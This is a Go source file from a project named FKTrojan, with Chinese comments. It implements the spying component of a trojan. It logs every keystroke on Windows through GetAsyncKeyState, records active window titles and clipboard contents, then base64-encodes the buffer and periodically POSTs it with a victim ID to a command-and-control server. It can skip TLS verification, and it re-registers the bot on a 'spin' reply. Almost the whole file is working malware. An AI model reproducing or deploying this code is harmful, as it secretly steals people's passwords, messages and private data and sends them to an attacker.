/*
Author: FreeKnight
用户行为信息记录
*/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"bytes"
	"fmt"
	"syscall"
	"time"
	"unsafe"

	"crypto/tls"
	"io/ioutil"
	"net/http"
	"net/url"

	"github.com/atotto/clipboard"
)

//------------------------------------------------------------
// 开启信息记录和同步
func startUserActionLogger() {
	go saveWindowLogger()    // 记录当前激活窗口标题信息
	go saveKeyLogger()       // 记录键盘信息
	go saveClipboardLogger() // 记录剪贴版内的信息

	go sendLoggerToServer() // 发送信息
}

//------------------------------------------------------------
// 获取当前激活状态的窗口句柄
func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

//------------------------------------------------------------
// 获取指定窗口句柄的窗口标题文字
func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

//------------------------------------------------------------
// 记录当前激活窗口信息
func saveWindowLogger() {
	var tmpWindowTitle string
	for {
		// 只允许咪咪眼
		takeASnap()

		g, _ := getForegroundWindow()
		b := make([]uint16, 200)
		getWindowText(g, &b[0], int32(len(b)))
		if syscall.UTF16ToString(b) != "" {
			if tmpWindowTitle != syscall.UTF16ToString(b) {
				tmpWindowTitle = syscall.UTF16ToString(b)
				tmpKeylogBuffer += string("\r\n[WindowTitle: " + syscall.UTF16ToString(b) + "]\r\n")
			}
		}
	}
}

//------------------------------------------------------------
// 记录剪切板信息
func saveClipboardLogger() {
	lastClipboard := ""
	for {
		// 剪贴板并非常用，可以多休息会儿
		takeALonglongRest()

		text, _ := clipboard.ReadAll()
		if text != lastClipboard {
			lastClipboard = text
			tmpKeylogBuffer += string("\r\n[Clipboard: " + text + "]\r\n")
		}
	}
}

//------------------------------------------------------------
// 保存按键信息
func saveKeyLogger() {
	for {
		// 超短暂休息
		takeASnap()

		// 檢查shift键是否被按下
		shiftchk, _, _ := procGetAsyncKeyState.Call(uintptr(vk_SHIFT))
		var shift bool
		if shiftchk == 0x8000 {
			shift = true
		} else {
			shift = false
		}
		// 检查cap键是否被按下
		capschk, _, _ := procGetAsyncKeyState.Call(uintptr(vk_CAPITAL))
		var caps bool
		if capschk&1 == 0 {
			caps = true
		} else {
			caps = false
		}

		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			if int(Val) == -32767 {
				switch KEY {
				case vk_CONTROL:
					tmpKeylogBuffer += "[Ctrl]"
				case vk_BACK:
					tmpKeylogBuffer += "[Back]"
				case vk_TAB:
					tmpKeylogBuffer += "[Tab]"
				case vk_RETURN:
					tmpKeylogBuffer += "[Enter]\r\n"
				case vk_SHIFT:
					tmpKeylogBuffer += "[Shift]"
				case vk_MENU:
					tmpKeylogBuffer += "[Alt]"
				case vk_CAPITAL:
					tmpKeylogBuffer += "[CapsLock]"
					if caps {
						caps = false
					} else {
						caps = true
					}
				case vk_ESCAPE:
					tmpKeylogBuffer += "[Esc]"
				case vk_SPACE:
					tmpKeylogBuffer += " "
				case vk_PRIOR:
					tmpKeylogBuffer += "[PageUp]"
				case vk_NEXT:
					tmpKeylogBuffer += "[PageDown]"
				case vk_END:
					tmpKeylogBuffer += "[End]"
				case vk_HOME:
					tmpKeylogBuffer += "[Home]"
				case vk_LEFT:
					tmpKeylogBuffer += "[Left]"
				case vk_UP:
					tmpKeylogBuffer += "[Up]"
				case vk_RIGHT:
					tmpKeylogBuffer += "[Right]"
				case vk_DOWN:
					tmpKeylogBuffer += "[Down]"
				case vk_SELECT:
					tmpKeylogBuffer += "[Select]"
				case vk_PRINT:
					tmpKeylogBuffer += "[Print]"
				case vk_EXECUTE:
					tmpKeylogBuffer += "[Execute]"
				case vk_SNAPSHOT:
					tmpKeylogBuffer += "[PrintScreen]"
				case vk_INSERT:
					tmpKeylogBuffer += "[Insert]"
				case vk_DELETE:
					tmpKeylogBuffer += "[Delete]"
				case vk_LWIN:
					tmpKeylogBuffer += "[LeftWindows]"
				case vk_RWIN:
					tmpKeylogBuffer += "[RightWindows]"
				case vk_APPS:
					tmpKeylogBuffer += "[Applications]"
				case vk_SLEEP:
					tmpKeylogBuffer += "[Sleep]"
				case vk_NUMPAD0:
					tmpKeylogBuffer += "[Pad 0]"
				case vk_NUMPAD1:
					tmpKeylogBuffer += "[Pad 1]"
				case vk_NUMPAD2:
					tmpKeylogBuffer += "[Pad 2]"
				case vk_NUMPAD3:
					tmpKeylogBuffer += "[Pad 3]"
				case vk_NUMPAD4:
					tmpKeylogBuffer += "[Pad 4]"
				case vk_NUMPAD5:
					tmpKeylogBuffer += "[Pad 5]"
				case vk_NUMPAD6:
					tmpKeylogBuffer += "[Pad 6]"
				case vk_NUMPAD7:
					tmpKeylogBuffer += "[Pad 7]"
				case vk_NUMPAD8:
					tmpKeylogBuffer += "[Pad 8]"
				case vk_NUMPAD9:
					tmpKeylogBuffer += "[Pad 9]"
				case vk_MULTIPLY:
					tmpKeylogBuffer += "*"
				case vk_ADD:
					if shift {
						tmpKeylogBuffer += "+"
					} else {
						tmpKeylogBuffer += "="
					}
				case vk_SEPARATOR:
					tmpKeylogBuffer += "[Separator]"
				case vk_SUBTRACT:
					if shift {
						tmpKeylogBuffer += "_"
					} else {
						tmpKeylogBuffer += "-"
					}
				case vk_DECIMAL:
					tmpKeylogBuffer += "."
				case vk_DIVIDE:
					tmpKeylogBuffer += "[Devide]"
				case vk_F1:
					tmpKeylogBuffer += "[F1]"
				case vk_F2:
					tmpKeylogBuffer += "[F2]"
				case vk_F3:
					tmpKeylogBuffer += "[F3]"
				case vk_F4:
					tmpKeylogBuffer += "[F4]"
				case vk_F5:
					tmpKeylogBuffer += "[F5]"
				case vk_F6:
					tmpKeylogBuffer += "[F6]"
				case vk_F7:
					tmpKeylogBuffer += "[F7]"
				case vk_F8:
					tmpKeylogBuffer += "[F8]"
				case vk_F9:
					tmpKeylogBuffer += "[F9]"
				case vk_F10:
					tmpKeylogBuffer += "[F10]"
				case vk_F11:
					tmpKeylogBuffer += "[F11]"
				case vk_F12:
					tmpKeylogBuffer += "[F12]"
				case vk_NUMLOCK:
					tmpKeylogBuffer += "[NumLock]"
				case vk_SCROLL:
					tmpKeylogBuffer += "[ScrollLock]"
				case vk_LSHIFT:
					tmpKeylogBuffer += "[LeftShift]"
				case vk_RSHIFT:
					tmpKeylogBuffer += "[RightShift]"
				case vk_LCONTROL:
					tmpKeylogBuffer += "[LeftCtrl]"
				case vk_RCONTROL:
					tmpKeylogBuffer += "[RightCtrl]"
				case vk_LMENU:
					tmpKeylogBuffer += "[LeftMenu]"
				case vk_RMENU:
					tmpKeylogBuffer += "[RightMenu]"
				case vk_OEM_1:
					if shift {
						tmpKeylogBuffer += ":"
					} else {
						tmpKeylogBuffer += ";"
					}
				case vk_OEM_2:
					if shift {
						tmpKeylogBuffer += "?"
					} else {
						tmpKeylogBuffer += "/"
					}
				case vk_OEM_3:
					if shift {
						tmpKeylogBuffer += "~"
					} else {
						tmpKeylogBuffer += "`"
					}
				case vk_OEM_4:
					if shift {
						tmpKeylogBuffer += "{"
					} else {
						tmpKeylogBuffer += "["
					}
				case vk_OEM_5:
					if shift {
						tmpKeylogBuffer += "|"
					} else {
						tmpKeylogBuffer += "\\"
					}
				case vk_OEM_6:
					if shift {
						tmpKeylogBuffer += "}"
					} else {
						tmpKeylogBuffer += "]"
					}
				case vk_OEM_7:
					if shift {
						tmpKeylogBuffer += `"`
					} else {
						tmpKeylogBuffer += "'"
					}
				case vk_OEM_PERIOD:
					if shift {
						tmpKeylogBuffer += ">"
					} else {
						tmpKeylogBuffer += "."
					}
				case 0x30:
					if shift {
						tmpKeylogBuffer += ")"
					} else {
						tmpKeylogBuffer += "0"
					}
				case 0x31:
					if shift {
						tmpKeylogBuffer += "!"
					} else {
						tmpKeylogBuffer += "1"
					}
				case 0x32:
					if shift {
						tmpKeylogBuffer += "@"
					} else {
						tmpKeylogBuffer += "2"
					}
				case 0x33:
					if shift {
						tmpKeylogBuffer += "#"
					} else {
						tmpKeylogBuffer += "3"
					}
				case 0x34:
					if shift {
						tmpKeylogBuffer += "$"
					} else {
						tmpKeylogBuffer += "4"
					}
				case 0x35:
					if shift {
						tmpKeylogBuffer += "%"
					} else {
						tmpKeylogBuffer += "5"
					}
				case 0x36:
					if shift {
						tmpKeylogBuffer += "^"
					} else {
						tmpKeylogBuffer += "6"
					}
				case 0x37:
					if shift {
						tmpKeylogBuffer += "&"
					} else {
						tmpKeylogBuffer += "7"
					}
				case 0x38:
					if shift {
						tmpKeylogBuffer += "*"
					} else {
						tmpKeylogBuffer += "8"
					}
				case 0x39:
					if shift {
						tmpKeylogBuffer += "("
					} else {
						tmpKeylogBuffer += "9"
					}
				case 0x41:
					if caps || shift {
						tmpKeylogBuffer += "A"
					} else {
						tmpKeylogBuffer += "a"
					}
				case 0x42:
					if caps || shift {
						tmpKeylogBuffer += "B"
					} else {
						tmpKeylogBuffer += "b"
					}
				case 0x43:
					if caps || shift {
						tmpKeylogBuffer += "C"
					} else {
						tmpKeylogBuffer += "c"
					}
				case 0x44:
					if caps || shift {
						tmpKeylogBuffer += "D"
					} else {
						tmpKeylogBuffer += "d"
					}
				case 0x45:
					if caps || shift {
						tmpKeylogBuffer += "E"
					} else {
						tmpKeylogBuffer += "e"
					}
				case 0x46:
					if caps || shift {
						tmpKeylogBuffer += "F"
					} else {
						tmpKeylogBuffer += "f"
					}
				case 0x47:
					if caps || shift {
						tmpKeylogBuffer += "G"
					} else {
						tmpKeylogBuffer += "g"
					}
				case 0x48:
					if caps || shift {
						tmpKeylogBuffer += "H"
					} else {
						tmpKeylogBuffer += "h"
					}
				case 0x49:
					if caps || shift {
						tmpKeylogBuffer += "I"
					} else {
						tmpKeylogBuffer += "i"
					}
				case 0x4A:
					if caps || shift {
						tmpKeylogBuffer += "J"
					} else {
						tmpKeylogBuffer += "j"
					}
				case 0x4B:
					if caps || shift {
						tmpKeylogBuffer += "K"
					} else {
						tmpKeylogBuffer += "k"
					}
				case 0x4C:
					if caps || shift {
						tmpKeylogBuffer += "L"
					} else {
						tmpKeylogBuffer += "l"
					}
				case 0x4D:
					if caps || shift {
						tmpKeylogBuffer += "M"
					} else {
						tmpKeylogBuffer += "m"
					}
				case 0x4E:
					if caps || shift {
						tmpKeylogBuffer += "N"
					} else {
						tmpKeylogBuffer += "n"
					}
				case 0x4F:
					if caps || shift {
						tmpKeylogBuffer += "O"
					} else {
						tmpKeylogBuffer += "o"
					}
				case 0x50:
					if caps || shift {
						tmpKeylogBuffer += "P"
					} else {
						tmpKeylogBuffer += "p"
					}
				case 0x51:
					if caps || shift {
						tmpKeylogBuffer += "Q"
					} else {
						tmpKeylogBuffer += "q"
					}
				case 0x52:
					if caps || shift {
						tmpKeylogBuffer += "R"
					} else {
						tmpKeylogBuffer += "r"
					}
				case 0x53:
					if caps || shift {
						tmpKeylogBuffer += "S"
					} else {
						tmpKeylogBuffer += "s"
					}
				case 0x54:
					if caps || shift {
						tmpKeylogBuffer += "T"
					} else {
						tmpKeylogBuffer += "t"
					}
				case 0x55:
					if caps || shift {
						tmpKeylogBuffer += "U"
					} else {
						tmpKeylogBuffer += "u"
					}
				case 0x56:
					if caps || shift {
						tmpKeylogBuffer += "V"
					} else {
						tmpKeylogBuffer += "v"
					}
				case 0x57:
					if caps || shift {
						tmpKeylogBuffer += "W"
					} else {
						tmpKeylogBuffer += "w"
					}
				case 0x58:
					if caps || shift {
						tmpKeylogBuffer += "X"
					} else {
						tmpKeylogBuffer += "x"
					}
				case 0x59:
					if caps || shift {
						tmpKeylogBuffer += "Y"
					} else {
						tmpKeylogBuffer += "y"
					}
				case 0x5A:
					if caps || shift {
						tmpKeylogBuffer += "Z"
					} else {
						tmpKeylogBuffer += "z"
					}
				}
			}
		}
	}
}

//------------------------------------------------------------
// 发送键盘消息给服务器
func sendLoggerToServer() {
	for isUserActionLogging {
		// 先歇会儿
		time.Sleep(time.Duration(autoKeyloggerInterval) * time.Minute)

		if tmpKeylogBuffer == "" {
			continue
		}

		client := http.DefaultClient
		if useSSL {
			tr := &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: sslInsecureSkipVerify},
			}
			client = &http.Client{Transport: tr}
		} else {
			client = &http.Client{}
		}

		if client == http.DefaultClient {
			continue
		}

		FKDebugLog("Sending key log to server...")

		data := url.Values{}
		data.Set("0", myUID)
		data.Add("1", common.Base64Encode(tmpKeylogBuffer)) // base64加密
		u, _ := url.ParseRequestURI(serverAddress + "key")
		urlStr := fmt.Sprintf("%v", u)
		r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
		r.Header.Set("User-Agent", userAgentKey)
		r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(r)
		if err != nil {
			continue
		} else {
			defer resp.Body.Close()
			resp_body, _ := ioutil.ReadAll(resp.Body)
			if resp.StatusCode == 200 {
				if len(string(resp_body)) > 2 {
					if string(resp_body) == "spin" {
						registerBot()
					} else {
						tmpKeylogBuffer = "" // 清零该缓冲区
					}
				}
			}
		}

	}
}

//------------------------------------------------------------
